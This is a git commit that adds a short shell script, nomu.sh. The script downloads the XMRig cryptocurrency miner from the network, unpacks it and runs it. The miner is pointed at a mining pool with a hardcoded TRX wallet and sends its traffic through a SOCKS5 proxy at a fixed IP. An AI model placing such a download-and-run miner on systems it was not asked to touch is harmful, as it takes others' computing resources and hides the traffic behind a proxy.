28fb7e5b93cae0a079313c38c50d8145ee28cab9
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-21 05:52:55 +0700

    Create nomu.sh

---
+++ nomu.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz
+tar -xvf xmrig-6.18.0-bionic-x64.tar.gz
+cd xmrig-6.18.0
+./xmrig -o rx.unmineable.com:3333 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM.w1 -p x -k -x socks5://50.116.14.201:7497
